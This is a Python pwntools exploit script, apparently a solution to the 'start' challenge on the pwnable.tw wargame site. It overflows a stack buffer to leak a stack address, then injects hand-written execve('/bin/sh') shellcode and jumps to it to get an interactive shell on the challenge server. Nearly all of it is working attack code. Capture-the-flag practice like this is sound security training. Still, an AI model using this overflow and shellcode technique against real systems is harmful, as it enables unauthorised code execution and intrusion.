from pwn import *
context.log_level = "debug"

#r = process("./start")
r = remote("chall.pwnable.tw", 10000)

shellcode = """
    call here
    .ascii "/bin/sh"
    .byte 0
here:
    pop ebx
    xor ecx, ecx
    xor edx, edx
    mov eax, 0xb
    int 0x80
    """
shellcode = asm(shellcode)
print hex(len(shellcode))

r.recvuntil("Let's start the CTF:")
payload = 'a'*0x14 + '\x87'
r.send(payload)

stack = u32(r.recv(4)) + 0x14

payload = 'a'*0x14 + p32(stack)
payload += shellcode

r.send(payload)
r.interactive()
